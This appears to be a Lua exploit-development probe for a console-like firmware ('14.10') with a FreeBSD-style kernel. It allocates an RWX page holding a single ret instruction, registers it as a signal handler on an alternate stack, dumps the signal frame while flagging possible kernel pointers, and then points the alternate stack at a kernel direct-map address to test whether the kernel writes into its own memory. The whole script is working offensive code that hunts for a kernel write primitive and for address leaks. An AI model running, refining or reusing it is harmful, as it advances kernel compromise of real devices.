-- 14.10 Recon Probe 26b: Create executable ret gadget via mmap
-- Can't read code memory (execute-only or API limitation)
-- Instead: mmap RWX page, write 0xC3 (ret), use as signal handler
-- On signal delivery, kernel builds frame on altstack, calls handler
-- Handler does "ret" → sigreturn trampoline → clean resume

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: RET GADGET VIA MMAP ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_mmap = 477,
    sc_munmap = 73,
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_kill = 37,
    sc_getpid = 20,
    sc_mprotect = 74,
})

local SA_SIZE = 64
local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local ss_new = memory.alloc(32)
local ss_old = memory.alloc(32)
local pid = syscall.sc_getpid():tonumber()

-- ============================================================
-- PART 1: mmap RWX page
-- ============================================================
log("")
log("--- PART 1: mmap executable page ---")

-- mmap(NULL, 4096, PROT_RWX, MAP_ANON|MAP_PRIVATE, -1, 0)
local PROT_READ = 1
local PROT_WRITE = 2
local PROT_EXEC = 4
local MAP_PRIVATE = 2
local MAP_ANON = 0x1000

local rwx_ok, rwx_ptr = pcall(function()
    return syscall.sc_mmap(0, 4096,
        PROT_READ + PROT_WRITE + PROT_EXEC,
        MAP_PRIVATE + MAP_ANON, -1, 0)
end)

if rwx_ok then
    local addr = rwx_ptr:tonumber()
    log(string.format("  RWX mmap: 0x%x", addr))

    if addr > 0 and addr ~= 0xFFFFFFFFFFFFFFFF then
        -- Write ret instruction
        memory.write_byte(rwx_ptr, 0xC3) -- ret
        -- Verify
        local verify = memory.read_byte(rwx_ptr):tonumber()
        log(string.format("  verify byte: 0x%02x", verify))

        -- ============================================================
        -- PART 2: Test ret gadget as signal handler on user altstack
        -- ============================================================
        log("")
        log("--- PART 2: test ret handler + user altstack ---")

        local STACK_SZ = 32768
        local test_stack = memory.alloc(STACK_SZ)
        for i = 0, STACK_SZ - 4, 4 do
            memory.write_dword(test_stack + i, 0x44440000 + i)
        end

        -- Set altstack
        memory.write_qword(ss_new, test_stack)
        memory.write_qword(ss_new + 8, STACK_SZ)
        memory.write_dword(ss_new + 16, 0)
        pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

        -- Set SIGUSR1 handler to ret gadget
        for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
        memory.write_qword(sa_new, rwx_ptr)
        memory.write_dword(sa_new + 8, 0x0001 + 0x0040) -- SA_ONSTACK|SA_SIGINFO
        pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

        log("  sending SIGUSR1...")
        local k_ok, k_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
        log("  kill rv=" .. (k_ok and tostring(k_ret:tonumber()) or "ERR"))

        local alive = pcall(function() return syscall.sc_getpid() end)
        log("  alive: " .. tostring(alive))

        if alive then
            -- Check altstack modification (signal frame written?)
            local modified = 0
            local first_mod = -1
            for i = 0, STACK_SZ - 4, 4 do
                local v = memory.read_dword(test_stack + i):tonumber()
                if v ~= 0x44440000 + i then
                    modified = modified + 1
                    if first_mod < 0 then first_mod = i end
                end
            end
            log("  altstack modified dwords: " .. modified)

            if modified > 0 then
                log("  *** SIGNAL FRAME WRITTEN! ret gadget WORKS ***")
                log(string.format("  first mod at +%d", first_mod))

                -- Dump signal frame (look for kernel pointers!)
                log("  frame dump:")
                for i = first_mod, math.min(first_mod + 384, STACK_SZ - 8), 8 do
                    local lo = memory.read_dword(test_stack + i):tonumber()
                    local hi = memory.read_dword(test_stack + i + 4):tonumber()
                    if hi ~= 0x44440000 + i + 4 or lo ~= 0x44440000 + i then
                        local tag = ""
                        if hi >= 0xFFFF0000 then tag = " ***KPTR***" end
                        log(string.format("    +%04x: 0x%08x%08x%s", i, hi, lo, tag))
                    end
                end

                -- ==============================================
                -- PART 3: KERNEL ALTSTACK + RET GADGET
                -- ==============================================
                log("")
                log("--- PART 3: KERNEL ALTSTACK + RET GADGET ---")

                -- Disable current altstack
                memory.write_dword(ss_new + 16, 4) -- SS_DISABLE
                pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

                -- Set kernel DMAP altstack
                memory.write_dword(ss_new, 0x10000000)
                memory.write_dword(ss_new + 4, 0xFFFFF800)
                memory.write_qword(ss_new + 8, STACK_SZ)
                memory.write_dword(ss_new + 16, 0)
                local kss = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
                log("  set kernel DMAP altstack: " .. tostring(kss))

                -- Handler still set to ret gadget + SA_ONSTACK
                log("  sending SIGUSR1 with KERNEL altstack...")
                local k2_ok, k2_ret = pcall(function()
                    return syscall.sc_kill(pid, 30)
                end)
                log("  kill rv=" .. (k2_ok and tostring(k2_ret:tonumber()) or "ERR"))

                local alive2 = pcall(function() return syscall.sc_getpid() end)
                log("  alive after kernel altstack signal: " .. tostring(alive2))

                if alive2 then
                    log("  *** SURVIVED kernel altstack signal delivery ***")
                    log("  Possible outcomes:")
                    log("    a) copyout() validated and returned EFAULT")
                    log("    b) kernel wrote signal frame to DMAP (!!!)")
                end

                -- Disable altstack
                memory.write_dword(ss_new + 16, 4)
                pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
            else
                log("  altstack NOT modified — signal didn't use altstack")
            end
        else
            log("  CRASHED — ret gadget didn't return cleanly")
        end
    else
        log("  mmap failed (returned MAP_FAILED or 0)")

        -- Try RW then mprotect to RWX
        log("")
        log("--- fallback: mmap RW + mprotect ---")
        local rw_ok, rw_ptr = pcall(function()
            return syscall.sc_mmap(0, 4096,
                PROT_READ + PROT_WRITE,
                MAP_PRIVATE + MAP_ANON, -1, 0)
        end)
        if rw_ok then
            local rw_addr = rw_ptr:tonumber()
            log(string.format("  RW mmap: 0x%x", rw_addr))
            if rw_addr > 0 then
                memory.write_byte(rw_ptr, 0xC3)
                local mp_ok, mp_ret = pcall(function()
                    return syscall.sc_mprotect(rw_ptr, 4096,
                        PROT_READ + PROT_WRITE + PROT_EXEC)
                end)
                log("  mprotect RWX: " ..
                    (mp_ok and "rv=" .. mp_ret:tonumber() or "ERR"))

                -- Even if mprotect fails, try RW+exec (some kernels
                -- allow exec from RW pages without explicit PROT_EXEC)
                local mp2_ok, mp2_ret = pcall(function()
                    return syscall.sc_mprotect(rw_ptr, 4096,
                        PROT_READ + PROT_EXEC)
                end)
                log("  mprotect RX: " ..
                    (mp2_ok and "rv=" .. mp2_ret:tonumber() or "ERR"))
            end
        end
    end
else
    log("  mmap RWX call failed")

    -- Try without PROT_EXEC
    log("  trying RW only...")
    local rw2_ok, rw2_ptr = pcall(function()
        return syscall.sc_mmap(0, 4096,
            PROT_READ + PROT_WRITE,
            MAP_PRIVATE + MAP_ANON, -1, 0)
    end)
    if rw2_ok then
        log(string.format("  RW mmap: 0x%x", rw2_ptr:tonumber()))
    end
end

-- Cleanup
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
memory.write_dword(ss_new + 16, 4)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

log("")
log("=== GADGET DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
